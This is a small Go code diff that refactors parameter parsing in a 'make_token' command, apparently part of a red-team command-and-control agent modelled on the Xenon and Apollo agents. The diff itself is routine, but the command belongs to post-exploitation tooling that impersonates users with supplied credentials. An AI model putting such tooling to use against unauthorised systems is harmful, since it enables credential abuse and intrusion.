@@ -4,7 +4,6 @@
 package commands
 
 import (
-	"encoding/json"
 	"fmt"
 	"strings"
 	"syscall"
@@ -37,9 +36,9 @@ type MakeTokenParams struct {
 // Execute implements Xenon's TokenMake function from Token.c (lines 189-264)
 // and Apollo's SetIdentity from IdentityManager.cs
 func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
-	var params MakeTokenParams
-	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
-		return errorf("Failed to parse parameters: %v", err)
+	params, parseErr := unmarshalParams[MakeTokenParams](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 	defer zeroCredentials(&params.Password)
 
